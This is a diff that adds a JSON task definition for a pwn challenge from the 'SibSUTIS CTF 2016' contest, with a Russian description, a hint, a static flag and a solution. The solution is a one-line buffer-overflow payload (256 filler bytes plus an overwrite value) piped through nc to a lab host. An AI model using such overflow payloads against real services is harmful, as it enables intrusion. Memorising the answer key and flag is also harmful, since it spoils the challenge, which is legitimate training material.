@@ -1,0 +1,44 @@
+{
+	"game":"SibSUTIS CTF 2016",
+	"name":"another binary file",
+	"category":"pwn",
+	"description":{
+		"RU":"В ваши руки попал исполняемый файл с наработками Доктора X. Посмотрите, что с ним можно сделать. nc 10.10.10.9 9001 - на всякий случай",
+		"EN":"No description"
+	},
+	"status": "verified",
+	"hints":[
+		{
+			"RU":"Что ты знаешь про дизассемблер?",
+			"EN":"No hints"
+		}
+	],
+	"solve": {
+		"RU": "python -c 'print(\"A\"*256+\"\xef\xbe\xad\xde\")' | nc 192.168.1.3 8006 \n проталкиваем в буффер любые 256 символов, затем заполняем той последовательностью, которую хочет наша проверка if(l1.a != 0xbeefdead) \n\n строка компиляции \n g++ server.cpp -o server -lpthread \n запуск \n./server",
+		"EN": "no"
+	},
+	"value":200,
+	"flag_type":"static",
+	"flag_key":"SCTF{PwN_N000_3at_N0o_sl33p}",
+	"files":[
+		{
+			"name":"game",
+			"location":"game"
+		}
+	],
+	"links":[
+		{
+			"dropbox":"",
+			"yandex":""
+		}
+	],
+	"authors":[
+		{
+			"team":"Not Found",
+			"name":"Txyza",
+			"contacts":[
+				"@Txyza"
+			]
+		}
+	]
+}
